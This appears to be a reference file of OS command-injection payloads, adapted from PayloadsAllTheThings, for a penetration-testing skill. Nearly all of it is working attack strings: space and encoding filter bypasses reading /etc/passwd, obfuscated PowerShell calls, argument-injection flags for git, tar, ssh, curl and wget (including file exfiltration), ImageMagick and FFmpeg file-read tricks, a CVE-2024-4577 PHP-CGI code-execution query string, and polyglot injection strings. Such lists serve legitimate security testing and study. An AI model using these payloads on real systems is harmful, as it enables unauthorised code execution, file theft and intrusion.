---
description: Argument injection per wrapper tool, Windows obfuscation, backslash-newline splitting, polyglots
skill: command-injection
source: PayloadsAllTheThings — Command Injection
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# OS Command Injection Payloads

> Source: PayloadsAllTheThings — Command Injection

## Filter Bypass — Spaces

### Windows Space Bypass

```cmd
ping%CommonProgramFiles:~10,-18%127.0.0.1
```

## Filter Bypass — Encoding

### Backslash-Newline (URL-Encoded)

```
cat%20/et%5C%0Ac/pa%5C%0Asswd
```

## Windows-Specific Payloads

```cmd
powershell C:\*\*2\n??e*d.*?
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e whoami
```

## Argument Injection

```bash
# Chrome GPU launcher
chrome '--gpu-launcher="id>/tmp/foo"'

# psql output
psql -o'|id>/tmp/foo'
```

### By wrapper tool

Input passed as an argv element (no shell) ignores separators; extra flags are the attack.

- **git:** `--upload-pack='<cmd>'` on clone/fetch; `-c core.sshCommand='<cmd>'`; `--template=<dir>`
  on init (hooks). The `ext::` transport is disabled by default (`protocol.allow`, git ≥ 2.12), so
  it works only where the app re-enables it. `git clone -- <url>` blocks flag injection.
- **tar:** `--checkpoint-action=exec=<cmd>`, `--to-command=<cmd>`, `--use-compress-program=<cmd>`
  (backup/restore features, auto-extracting uploads).
- **curl/wget:** `-o <webroot path>` (write), `-T <file> <url>` and `wget --post-file=<file>`
  (exfiltrate); `--upload-file`.
- **ssh:** `-oProxyCommand=<cmd>` as a hostname.
- **ImageMagick:** MSL scripts disguised as images and the `msl:`/`ephemeral:` pseudo-protocols
  (file read/write), SVG `<image>`/`url()` references (SSRF), filename delegates in old versions
  (CVE-2016-3714 lineage).
- **FFmpeg:** HLS playlists with `#EXT-X-MAP:URI="file:///etc/passwd"` render file contents into
  the transcoded output; `concat:` and playlist `http://` entries give SSRF; subtitle URLs fetch
  server-side.
- **`--` placement:** check that the terminator sits before your input; some programs still act
  on dangerous positional arguments after it.
- **PHP-CGI on Windows (CVE-2024-4577; XAMPP and other CGI-mode installs):** under some code pages
  (Chinese, Japanese) Windows "Best-Fit" maps the soft hyphen `%AD` to `-`, so a query string
  becomes php-cgi arguments: `?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`
  with PHP in the POST body. Unaffected: PHP ≥ 8.1.29 / 8.2.20 / 8.3.8, mod_php and PHP-FPM. Code
  execution: send a benign marker (`<?php echo md5('vigil'); ?>`) and stop there.

## Polyglot Payloads

```bash
# Multi-context (single/double/no quotes)
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

# Comprehensive polyglot
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
